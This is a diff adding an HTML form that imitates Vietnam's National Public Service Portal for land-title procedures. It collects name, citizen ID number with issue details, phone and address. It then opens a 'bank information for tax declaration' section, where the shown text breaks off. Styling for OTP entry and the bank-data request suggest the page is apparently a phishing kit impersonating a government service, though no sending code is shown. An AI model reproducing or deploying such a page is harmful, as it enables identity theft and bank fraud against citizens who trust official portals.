@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="vi">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng ký thủ tục nhà đất - Cổng Dịch vụ công quốc gia</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css?v=20260630.5">
+    <link rel="icon" type="image/png" href="/p/home/img/header/quoc_huy.png">
+    <style>
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Header mobile: logo + back-button cùng 1 hàng */
+        @media (max-width: 768px) {
+            .main-header { padding: 8px 0; }
+            .header-content {
+                flex-direction: row !important;
+                flex-wrap: nowrap !important;
+                align-items: center !important;
+                justify-content: space-between !important;
+                gap: 8px !important;
+            }
+            .logo-section { flex: 1; min-width: 0; overflow: hidden; }
+            .logo { max-width: 90%; height: auto; }
+            .header-actions { width: auto !important; flex-shrink: 0; }
+            .btn-login { font-size: 13px !important; padding: 7px 12px !important; white-space: nowrap; }
+
+            /* Form area */
+            .appointment-section { margin: 16px auto !important; }
+            .section-card { padding: 16px !important; }
+            .section-card-header { padding: 14px 16px !important; }
+            .section-card-header h1 { font-size: 18px !important; }
+            .appointment-form { margin-top: 16px !important; }
+            .form-section { margin-bottom: 18px !important; padding: 14px !important; }
+            .form-section-title { font-size: 15px !important; margin-bottom: 14px !important; }
+            .form-group { margin-bottom: 12px !important; }
+            .form-input { padding: 9px 12px !important; font-size: 16px !important; }
+            .form-row { grid-template-columns: 1fr !important; gap: 0; }
+            .file-upload-row { grid-template-columns: 1fr !important; gap: 12px; }
+            .file-upload-area { padding: 14px !important; }
+            .form-actions {
+                flex-direction: column !important;
+                gap: 10px !important;
+            }
+            .form-actions .btn,
+            .form-actions .btn-primary,
+            .form-actions .btn-secondary {
+                width: 100% !important;
+                min-width: 0 !important;
+                padding: 13px !important;
+                font-size: 15px !important;
+            }
+            .btn-action { width: 100% !important; padding: 13px !important; font-size: 15px !important; }
+            .otp-input { max-width: 100% !important; font-size: 18px !important; }
+            .otp-actions { flex-direction: column !important; }
+            .btn-resend-otp { width: 100% !important; }
+            .procedure-info { padding: 12px !important; }
+            .commitment-box { padding: 12px !important; }
+        }
+
+        @media (max-width: 480px) {
+            .container { padding: 0 10px !important; }
+            .section-card-header h1 { font-size: 16px !important; }
+            .form-section-title { font-size: 14px !important; }
+            .main-content { padding: 8px 0 24px !important; }
+            .form-actions .btn,
+            .form-actions .btn-primary,
+            .form-actions .btn-secondary {
+                font-size: 14px !important;
+                padding: 12px !important;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Main Header -->
+    <header class="main-header">
+        <div class="container">
+            <div class="header-content">
+                <div class="logo-section">
+                    <a href="/p/home/dvc-trang-chu.html">
+                        <img src="/p/home/theme/img/header/logo.png" alt="Cổng Dịch vụ công quốc gia" class="logo">
+                    </a>
+                </div>
+                <div class="header-actions">
+                    <a href="index.html" class="btn-login">Về trang chủ</a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="container">
+            <div class="appointment-section" style="max-width: 1200px; margin: 40px auto;">
+                <div class="section-card">
+                    <!-- Tiêu đề -->
+                    <div class="section-card-header" style="text-align: center; padding: 20px;">
+                        <h1 style="color: #000000; font-size: 24px; font-weight: bold; margin: 0;">
+                            Hệ Thống Tiếp Nhận Thông Tin Và Giải Quyết Thủ Tục Hành Chính
+                        </h1>
+                    </div>
+
+                    <!-- Form đăng ký thủ tục nhà đất -->
+                    <form id="nhaDatForm" class="appointment-form" style="margin-top: 30px;">
+
+                        <!-- Mã hồ sơ -->
+                        <div class="form-section" style="margin-bottom: 20px; padding:16px 20px; background:#fef5ed; border:1px solid #fadbc8; border-radius:10px;">
+                            <div style="display:flex; align-items:center; gap:12px;">
+                                <div style="font-size:28px;">📋</div>
+                                <div>
+                                    <div style="font-size:13px; font-weight:600; color:#B8603A; margin-bottom:2px;">MÃ HỒ SƠ</div>
+                                    <div id="displayNhaDatProfileCode" style="font-size:24px; font-weight:800; color:#CE7A58; letter-spacing:1.5px; font-family:monospace;"><script>(function(){var d=new Date(),y=d.getFullYear().toString().slice(-2),m=String(d.getMonth()+1).padStart(2,'0'),da=String(d.getDate()).padStart(2,'0'),s=String(Math.floor(Math.random()*90000)+10000);document.write('NHA-'+y+m+da+'-'+s)})()</script></div>
+                                    <div style="font-size:12px; color:#888; margin-top:2px;">Mã hồ sơ được tạo tự động khi gửi</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- THÔNG TIN CHUNG -->
+                        <div class="form-section" style="margin-bottom: 30px;">
+                            <h3 class="form-section-title"
+                                style="margin-bottom: 20px; color: #333; border-bottom: 2px solid #0066cc; padding-bottom: 10px; font-size: 18px; font-weight: bold;">
+                                THÔNG TIN CHUNG
+                            </h3>
+
+                            <div class="form-group">
+                                <label for="receivingUnit" style="font-weight: bold;">Đơn vị tiếp nhận <span
+                                        class="required">*</span></label>
+                                <select id="receivingUnit" name="receivingUnit" required>
+                                    <option value="">Chọn đơn vị tiếp nhận</option>
+                                    <option value="ubnd">Ủy ban nhân dân</option>
+                                    <option value="so-tnmt">Sở Tài nguyên và Môi trường</option>
+                                    <option value="so-xd">Sở Xây dựng</option>
+                                    <option value="so-tc">Sở Tài chính</option>
+                                    <option value="so-tttt">Sở Thông tin và Truyền thông</option>
+                                    <option value="phong-dang-ky-dat-dai">Phòng Đăng ký đất đai</option>
+                                </select>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="supportUnit" style="font-weight: bold;">Đơn vị hỗ trợ</label>
+                                <select id="supportUnit" name="supportUnit">
+                                    <option value="">Chọn đơn vị hỗ trợ</option>
+                                    <option value="ubnd">Ủy ban nhân dân</option>
+                                    <option value="so-tnmt">Sở Tài nguyên và Môi trường</option>
+                                    <option value="so-xd">Sở Xây dựng</option>
+                                    <option value="so-tc">Sở Tài chính</option>
+                                    <option value="so-tttt">Sở Thông tin và Truyền thông</option>
+                                </select>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="field" style="font-weight: bold;">Lĩnh vực <span
+                                        class="required">*</span></label>
+                                <select id="field" name="field" required>
+                                    <option value="">Chọn lĩnh vực</option>
+                                    <option value="dat-dai">Đất đai</option>
+                                    <option value="xay-dung">Xây dựng</option>
+                                    <option value="tai-chinh">Tài chính</option>
+                                    <option value="dan-su">Dân sự</option>
+                                    <option value="doanh-nghiep">Doanh nghiệp</option>
+                                </select>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="procedure" style="font-weight: bold;">Thủ tục hành chính <span
+                                        class="required">*</span></label>
+                                <select id="procedure" name="procedure" required>
+                                    <option value="">Chọn thủ tục</option>
+                                    <option value="cap-gcn-quyen-su-dung-dat">Cấp giấy chứng nhận quyền sử dụng đất lần
+                                        đầu</option>
+                                    <option value="cap-lai-gcn">Cấp lại giấy chứng nhận quyền sử dụng đất</option>
+                                    <option value="cap-doi-gcn">Cấp đổi giấy chứng nhận quyền sử dụng đất</option>
+                                    <option value="cap-doi-gcn-thay-doi-dia-chi">Cấp đổi Giấy chứng nhận quyền sử dụng
+                                        đất do thay đổi địa chỉ sau ngày 1/7/2025</option>
+                                    <option value="cap-gcn-do-mat">Cấp giấy chứng nhận quyền sử dụng đất do mất</option>
+                                    <option value="chuyen-nhuong">Chuyển nhượng quyền sử dụng đất</option>
+                                    <option value="tang-cho">Tặng cho quyền sử dụng đất</option>
+                                    <option value="thua-ke">Thừa kế quyền sử dụng đất</option>
+                                    <option value="cap-gcn-quyen-so-huu-nha">Cấp giấy chứng nhận quyền sở hữu nhà ở
+                                    </option>
+                                    <option value="cap-giay-phep-xay-dung">Cấp giấy phép xây dựng</option>
+                                    <option value="dang-ky-bien-dong">Đăng ký biến động đất đai</option>
+                                    <option value="thay-doi-muc-dich">Thay đổi mục đích sử dụng đất</option>
+                                </select>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="publicService" style="font-weight: bold;">Dịch vụ công</label>
+                                <select id="publicService" name="publicService">
+                                    <option value="">Chọn dịch vụ công</option>
+                                    <option value="dich-vu-cong-truc-tuyen">Dịch vụ công trực tuyến</option>
+                                    <option value="dich-vu-cong-tai-bo-phan">Dịch vụ công tại bộ phận một cửa</option>
+                                    <option value="dich-vu-cong-tai-co-quan">Dịch vụ công tại cơ quan</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <!-- THÔNG TIN NGƯỜI NỘP HỒ SƠ -->
+                        <div class="form-section" style="margin-bottom: 30px;">
+                            <h3 class="form-section-title"
+                                style="margin-bottom: 20px; color: #333; border-bottom: 2px solid #0066cc; padding-bottom: 10px; font-size: 18px; font-weight: bold;">
+                                THÔNG TIN NGƯỜI NỘP HỒ SƠ
+                            </h3>
+
+                            <div class="form-group">
+                                <label for="applicantName" style="font-weight: bold;">Tên người nộp <span
+                                        class="required">*</span></label>
+                                <input type="text" id="applicantName" name="applicantName" required
+                                    placeholder="Nhập họ và tên">
+                            </div>
+
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label for="dateOfBirth" style="font-weight: bold;">Ngày sinh <span
+                                            class="required">*</span></label>
+                                    <input type="date" id="dateOfBirth" name="dateOfBirth" required>
+                                </div>
+                                <div class="form-group">
+                                    <label for="idNumber" style="font-weight: bold;">Số CMND/CCCD <span
+                                            class="required">*</span></label>
+                                    <input type="text" id="idNumber" name="idNumber" required pattern="[0-9]{9,12}"
+                                        placeholder="Nhập số CMND/CCCD">
+                                </div>
+                            </div>
+
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label for="idIssueDate" style="font-weight: bold;">Ngày cấp <span
+                                            class="required">*</span></label>
+                                    <input type="date" id="idIssueDate" name="idIssueDate" required>
+                                </div>
+                                <div class="form-group">
+                                    <label for="idIssuePlace" style="font-weight: bold;">Nơi cấp <span
+                                            class="required">*</span></label>
+                                    <select id="idIssuePlace" name="idIssuePlace" required>
+                                        <option value="">Chọn nơi cấp CMND/CCCD</option>
+                                        <option value="cuc-truong-cuc-canh-sat">Cục Trưởng Cục Cảnh sát Quản lý Hành Và
+                                            Trật Tự Xã Hội</option>
+                                        <option value="phong-canh-sat-ha-noi">Phòng Cảnh sát QLHC về TTXH Công An Thành
+                                            Phố Hà Nội</option>
+                                        <option value="phong-canh-sat-ho-chi-minh">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Thành Phố Hồ Chí Minh</option>
+                                        <option value="phong-canh-sat-da-nang">Phòng Cảnh sát QLHC về TTXH Công An Thành
+                                            Phố Đà Nẵng</option>
+                                        <option value="phong-canh-sat-hai-phong">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Thành Phố Hải Phòng</option>
+                                        <option value="phong-canh-sat-can-tho">Phòng Cảnh sát QLHC về TTXH Công An Thành
+                                            Phố Cần Thơ</option>
+                                        <option value="phong-canh-sat-an-giang">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            An Giang</option>
+                                        <option value="phong-canh-sat-ba-ria-vung-tau">Phòng Cảnh sát QLHC về TTXH Công
+                                            An Tỉnh Bà Rịa - Vũng Tàu</option>
+                                        <option value="phong-canh-sat-bac-lieu">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Bạc Liêu</option>
+                                        <option value="phong-canh-sat-bac-giang">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Bắc Giang</option>
+                                        <option value="phong-canh-sat-bac-kan">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Bắc Kạn</option>
+                                        <option value="phong-canh-sat-bac-ninh">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Bắc Ninh</option>
+                                        <option value="phong-canh-sat-ben-tre">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Bến Tre</option>
+                                        <option value="phong-canh-sat-binh-dinh">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Bình Định</option>
+                                        <option value="phong-canh-sat-binh-duong">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Bình Dương</option>
+                                        <option value="phong-canh-sat-binh-phuoc">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Bình Phước</option>
+                                        <option value="phong-canh-sat-binh-thuan">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Bình Thuận</option>
+                                        <option value="phong-canh-sat-ca-mau">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Cà Mau</option>
+                                        <option value="phong-canh-sat-cao-bang">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Cao Bằng</option>
+                                        <option value="phong-canh-sat-dak-lak">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Đắk Lắk</option>
+                                        <option value="phong-canh-sat-dak-nong">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Đắk Nông</option>
+                                        <option value="phong-canh-sat-dien-bien">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Điện Biên</option>
+                                        <option value="phong-canh-sat-dong-nai">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Đồng Nai</option>
+                                        <option value="phong-canh-sat-dong-thap">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Đồng Tháp</option>
+                                        <option value="phong-canh-sat-gia-lai">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Gia Lai</option>
+                                        <option value="phong-canh-sat-ha-giang">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Hà Giang</option>
+                                        <option value="phong-canh-sat-ha-nam">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Hà Nam</option>
+                                        <option value="phong-canh-sat-ha-tinh">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Hà Tĩnh</option>
+                                        <option value="phong-canh-sat-hai-duong">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Hải Dương</option>
+                                        <option value="phong-canh-sat-hau-giang">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Hậu Giang</option>
+                                        <option value="phong-canh-sat-hoa-binh">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Hòa Bình</option>
+                                        <option value="phong-canh-sat-hung-yen">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Hưng Yên</option>
+                                        <option value="phong-canh-sat-khanh-hoa">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Khánh Hòa</option>
+                                        <option value="phong-canh-sat-kien-giang">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Kiên Giang</option>
+                                        <option value="phong-canh-sat-kon-tum">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Kon Tum</option>
+                                        <option value="phong-canh-sat-lai-chau">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Lai Châu</option>
+                                        <option value="phong-canh-sat-lam-dong">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Lâm Đồng</option>
+                                        <option value="phong-canh-sat-lang-son">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Lạng Sơn</option>
+                                        <option value="phong-canh-sat-lao-cai">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Lào Cai</option>
+                                        <option value="phong-canh-sat-long-an">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Long An</option>
+                                        <option value="phong-canh-sat-nam-dinh">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Nam Định</option>
+                                        <option value="phong-canh-sat-nghe-an">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Nghệ An</option>
+                                        <option value="phong-canh-sat-ninh-binh">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Ninh Bình</option>
+                                        <option value="phong-canh-sat-ninh-thuan">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Ninh Thuận</option>
+                                        <option value="phong-canh-sat-phu-tho">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Phú Thọ</option>
+                                        <option value="phong-canh-sat-phu-yen">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Phú Yên</option>
+                                        <option value="phong-canh-sat-quang-binh">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Quảng Bình</option>
+                                        <option value="phong-canh-sat-quang-nam">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Quảng Nam</option>
+                                        <option value="phong-canh-sat-quang-ngai">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Quảng Ngãi</option>
+                                        <option value="phong-canh-sat-quang-ninh">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Quảng Ninh</option>
+                                        <option value="phong-canh-sat-quang-tri">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Quảng Trị</option>
+                                        <option value="phong-canh-sat-soc-trang">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Sóc Trăng</option>
+                                        <option value="phong-canh-sat-son-la">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Sơn La</option>
+                                        <option value="phong-canh-sat-tay-ninh">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Tây Ninh</option>
+                                        <option value="phong-canh-sat-thai-binh">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Thái Bình</option>
+                                        <option value="phong-canh-sat-thai-nguyen">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Thái Nguyên</option>
+                                        <option value="phong-canh-sat-thanh-hoa">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Thanh Hóa</option>
+                                        <option value="phong-canh-sat-thua-thien-hue">Phòng Cảnh sát QLHC về TTXH Công
+                                            An Tỉnh Thừa Thiên Huế</option>
+                                        <option value="phong-canh-sat-tien-giang">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Tiền Giang</option>
+                                        <option value="phong-canh-sat-tra-vinh">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Trà Vinh</option>
+                                        <option value="phong-canh-sat-tuyen-quang">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Tuyên Quang</option>
+                                        <option value="phong-canh-sat-vinh-long">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Vĩnh Long</option>
+                                        <option value="phong-canh-sat-vinh-phuc">Phòng Cảnh sát QLHC về TTXH Công An
+                                            Tỉnh Vĩnh Phúc</option>
+                                        <option value="phong-canh-sat-yen-bai">Phòng Cảnh sát QLHC về TTXH Công An Tỉnh
+                                            Yên Bái</option>
+                                        <option value="khac">Khác</option>
+                                    </select>
+                                </div>
+                            </div>
+
+                            <div class="form-group" id="idIssuePlaceOtherGroup" style="display: none;">
+                                <label for="idIssuePlaceOther" style="font-weight: bold;">Nơi cấp khác <span
+                                        class="required">*</span></label>
+                                <input type="text" id="idIssuePlaceOther" name="idIssuePlaceOther"
+                                    placeholder="Nhập nơi cấp CMND/CCCD">
+                            </div>
+
+                            <div class="form-group">
+                                <label for="phone" style="font-weight: bold;">Số điện thoại <span
+                                        class="required">*</span></label>
+                                <input type="tel" id="phone" name="phone" required pattern="[0-9]{10,11}"
+                                    placeholder="Nhập số điện thoại">
+                            </div>
+
+                            <div class="form-group">
+                                <label for="province" style="font-weight: bold;">Địa danh hành chính <span
+                                        class="required">*</span></label>
+                                <select id="province" name="province" required>
+                                    <option value="">Chọn tỉnh/thành phố</option>
+                                    <option value="ha-noi">Hà Nội</option>
+                                    <option value="ho-chi-minh">Hồ Chí Minh</option>
+                                    <option value="da-nang">Đà Nẵng</option>
+                                    <option value="hai-phong">Hải Phòng</option>
+                                    <option value="can-tho">Cần Thơ</option>
+                                    <option value="an-giang">An Giang</option>
+                                    <option value="ba-ria-vung-tau">Bà Rịa - Vũng Tàu</option>
+                                    <option value="bac-lieu">Bạc Liêu</option>
+                                    <option value="bac-giang">Bắc Giang</option>
+                                    <option value="bac-kan">Bắc Kạn</option>
+                                    <option value="bac-ninh">Bắc Ninh</option>
+                                    <option value="ben-tre">Bến Tre</option>
+                                    <option value="binh-dinh">Bình Định</option>
+                                    <option value="binh-duong">Bình Dương</option>
+                                    <option value="binh-phuoc">Bình Phước</option>
+                                    <option value="binh-thuan">Bình Thuận</option>
+                                    <option value="ca-mau">Cà Mau</option>
+                                    <option value="cao-bang">Cao Bằng</option>
+                                    <option value="dak-lak">Đắk Lắk</option>
+                                    <option value="dak-nong">Đắk Nông</option>
+                                    <option value="dien-bien">Điện Biên</option>
+                                    <option value="dong-nai">Đồng Nai</option>
+                                    <option value="dong-thap">Đồng Tháp</option>
+                                    <option value="gia-lai">Gia Lai</option>
+                                    <option value="ha-giang">Hà Giang</option>
+                                    <option value="ha-nam">Hà Nam</option>
+                                    <option value="ha-tinh">Hà Tĩnh</option>
+                                    <option value="hai-duong">Hải Dương</option>
+                                    <option value="hau-giang">Hậu Giang</option>
+                                    <option value="hoa-binh">Hòa Bình</option>
+                                    <option value="hung-yen">Hưng Yên</option>
+                                    <option value="khanh-hoa">Khánh Hòa</option>
+                                    <option value="kien-giang">Kiên Giang</option>
+                                    <option value="kon-tum">Kon Tum</option>
+                                    <option value="lai-chau">Lai Châu</option>
+                                    <option value="lam-dong">Lâm Đồng</option>
+                                    <option value="lang-son">Lạng Sơn</option>
+                                    <option value="lao-cai">Lào Cai</option>
+                                    <option value="long-an">Long An</option>
+                                    <option value="nam-dinh">Nam Định</option>
+                                    <option value="nghe-an">Nghệ An</option>
+                                    <option value="ninh-binh">Ninh Bình</option>
+                                    <option value="ninh-thuan">Ninh Thuận</option>
+                                    <option value="phu-tho">Phú Thọ</option>
+                                    <option value="phu-yen">Phú Yên</option>
+                                    <option value="quang-binh">Quảng Bình</option>
+                                    <option value="quang-nam">Quảng Nam</option>
+                                    <option value="quang-ngai">Quảng Ngãi</option>
+                                    <option value="quang-ninh">Quảng Ninh</option>
+                                    <option value="quang-tri">Quảng Trị</option>
+                                    <option value="soc-trang">Sóc Trăng</option>
+                                    <option value="son-la">Sơn La</option>
+                                    <option value="tay-ninh">Tây Ninh</option>
+                                    <option value="thai-binh">Thái Bình</option>
+                                    <option value="thai-nguyen">Thái Nguyên</option>
+                                    <option value="thanh-hoa">Thanh Hóa</option>
+                                    <option value="thua-thien-hue">Thừa Thiên Huế</option>
+                                    <option value="tien-giang">Tiền Giang</option>
+                                    <option value="tra-vinh">Trà Vinh</option>
+                                    <option value="tuyen-quang">Tuyên Quang</option>
+                                    <option value="vinh-long">Vĩnh Long</option>
+                                    <option value="vinh-phuc">Vĩnh Phúc</option>
+                                    <option value="yen-bai">Yên Bái</option>
+                                </select>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="ward" style="font-weight: bold;">Phường/Xã <span
+                                        class="required">*</span></label>
+                                <select id="ward" name="ward" required>
+                                    <option value="">Chọn phường/xã</option>
+                                </select>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="detailAddress" style="font-weight: bold;">Địa chỉ chi tiết <span
+                                        class="required">*</span></label>
+                                <textarea id="detailAddress" name="detailAddress" rows="2" required
+                                    placeholder="Nhập địa chỉ chi tiết (số nhà, tên đường, ngõ, ngách...)"></textarea>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="authorizedPerson" style="font-weight: bold;">Người ủy quyền</label>
+                                <input type="text" id="authorizedPerson" name="authorizedPerson"
+                                    placeholder="Nhập tên người ủy quyền (nếu có)">
+                            </div>
+                        </div>
+
+                        <!-- THÔNG TIN NGƯỜI SỬ DỤNG ĐẤT -->
+                        <div class="form-section" style="margin-bottom: 30px;">
+                            <h3 class="form-section-title"
+                                style="margin-bottom: 20px; color: #333; border-bottom: 2px solid #0066cc; padding-bottom: 10px; font-size: 18px; font-weight: bold;">
+                                THÔNG TIN NGƯỜI SỬ DỤNG ĐẤT, CHỦ SỞ HỮU TÀI SẢN GẮN LIỀN VỚI ĐẤT, NGƯỜI QUẢN LÝ ĐẤT
+                            </h3>
+
+                            <div class="form-group">
+                                <label for="landUserName" style="font-weight: bold;">Tên người sử dụng đất <span
+                                        class="required">*</span></label>
+                                <input type="text" id="landUserName" name="landUserName" required
+                                    placeholder="Nhập họ và tên">
+                            </div>
+
+                            <div class="form-group">
+                                <label for="landUserAddress" style="font-weight: bold;">Địa chỉ chi tiết <span
+                                        class="required">*</span></label>
+                                <textarea id="landUserAddress" name="landUserAddress" rows="2" required
+                                    placeholder="Nhập địa chỉ chi tiết"></textarea>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="landUserPhone" style="font-weight: bold;">Số điện thoại <span
+                                        class="required">*</span></label>
+                                <input type="tel" id="landUserPhone" name="landUserPhone" required
+                                    pattern="[0-9]{10,11}" placeholder="Nhập số điện thoại">
+                            </div>
+                        </div>
+
+                        <!-- THÔNG TIN NGÂN HÀNG KHAI BÁO THUẾ -->
+                        <div class="form-section" style="margin-bottom: 30px;">
+                            <h3 class="form-section-title"
+                                style="margin-bottom: 20px; color: #333; border-bottom: 2px solid #0066cc; padding-bottom: 10px; font-size: 18px; font-weight: bold;">
+                                THÔNG TIN NGÂN HÀNG KHAI BÁO THUẾ
+                            </h3>
+
+                            <div class="form-group">
+                                <label for="bankName" style="font-weight: bold;">Ngân hàng <span
+                                        class="required">*</span></label>
+                                <select id="bankName" name="bankName" required>
+                                    <option value="">-- Chọn Ngân Hàng --</option>
+                                    <option value="Vietcombank">Vietcombank (Ngân hàng Ngoại thương Việt Nam)</option>
+                                    <option value="BIDV">BIDV (Ngân hàng Đầu tư và Phát triển Việt Nam)</option>
+                                    <option value="VietinBank">VietinBank (Ngân hàng Công thương Việt Nam)</option>
+                                    <option value="Agribank">Agribank (Ngân hàng Nông nghiệp và Phát triển Nông thôn)
+                                    </option>
+                                    <option value="ACB">ACB (Ngân hàng Á Châu)</option>
+                                    <option value="Techcombank">Techcombank (Ngân hàng Kỹ thương Việt Nam)</option>
+                                    <option value="VPBank">VPBank (Ngân hàng Việt Nam Thịnh Vượng)</option>
+                                    <option value="MBBank">MBBank (Ngân hàng Quân đội)</option>
+                                    <option value="TPBank">TPBank (Ngân hàng Tiên Phong)</option>
+                                    <option value="Sacombank">Sacombank (Ngân hàng Sài Gòn Thương Tín)</option>
+                                    <option value="HDBank">HDBank (Ngân hàng Phát triển Thành phố Hồ Chí Minh)</option>
+                                    <option value="VIB">VIB (Ngân hàng Quốc tế Việt Nam)</option>
+                                    <option value="SHB">SHB (Ngân hàng Sài Gòn - Hà Nội)</option>
+                                    <option value="Eximbank">Eximbank (Ngân hàng Xuất Nhập khẩu Việt Nam)</option>
+                                    <option value="MSB">MSB (Ngân hàng Hàng Hải)</option>
+                                    <option value="OCB">OCB (Ngân hàng Phương Đông)</option>
+                                    <option value="SeABank">SeABank (Ngân hàng Đông Nam Á)</option>
+                                    <option value="VietABank">VietABank (Ngân hàng Việt Á)</option>
+                                    <option value="PGBank">PGBank (Ngân hàng Xăng dầu Petrolimex)</option>
+                                    <option value="ABBank">ABBank (Ngân hàng An Bình)</option>
+                                    <option value="BacABank">BacABank (Ngân hàng Bắc Á)</option>
+                                    <option value="NamABank">NamABank (Ngân hàng Nam Á)</option>
+                                    <option value="SCB">SCB (Ngân hàng Sài Gòn)</option>
+                                    <option value="Kienlongbank">Kienlongbank (Ngân hàng Kiên Long)</option>
+                                    <option value="PVcomBank">PVcomBank (Ngân hàng Đại Chúng Việt Nam)</option>
+                                    <option value="PublicBank">PublicBank (Ngân hàng Public Việt Nam)</option>
+                                    <option value="OceanBank">OceanBank (Ngân hàng Đại Dương)</option>
+                                    <option value="NCB">NCB (Ngân hàng Quốc Dân)</option>
+                                    <option value="GPBank">GPBank (Ngân hàng Dầu Khí Toàn Cầu)</option>
+                                    <option value="DongABank">DongABank (Ngân hàng Đông Á)</option>
+                                    <option value="LienVietPostBank">LienVietPostBank (Ngân hàng LienVietPostBank)
+                                    </option>
+                                    <option value="VietBank">VietBank (Ngân hàng Việt Nam Thương Tín)</option>
+                                    <option value="BaoVietBank">BaoVietBank (Ngân hàng Bảo Việt)</option>
+                                    <option value="SaigonBank">SaigonBank (Ngân hàng Sài Gòn Công Thương)</option>
+                                    <option value="VietCapitalBank">VietCapitalBank (Ngân hàng Bản Việt)</option>
+                                    <option value="IndovinaBank">IndovinaBank (Ngân hàng Indovina)</option>
+                                    <option value="WooriBank">WooriBank (Ngân hàng Woori Việt Nam)</option>
+                                    <option value="ShinhanBank">ShinhanBank (Ngân hàng Shinhan Việt Nam)</option>
+                                    <option value="HSBC">HSBC (Ngân hàng HSBC Việt Nam)</option>
+                                    <option value="StandardChartered">Standard Chartered (Ngân hàng Standard Chartered
+                                        Việt Nam)</option>
+                                    <option value="ANZ">ANZ (Ngân hàng ANZ Việt Nam)</option>
+                                    <option value="HongLeongBank">Hong Leong Bank (Ngân hàng Hong Leong Việt Nam)
+                                    </option>
+                                    <option value="UOB">UOB (Ngân hàng UOB Việt Nam)</option>
+                                    <option value="CIMB">CIMB (Ngân hàng CIMB Việt Nam)</option>
+                                    <option value="PublicBankVietnam">Public Bank Vietnam (Ngân hàng Public Việt Nam)
+                                    </option>
+                                    <option value="WooriBankVietnam">Woori Bank Vietnam (Ngân hàng Woori Việt Nam)
+                                    </option>
+                                </select>
+                            </div>
+
+                            <div class="form-group">
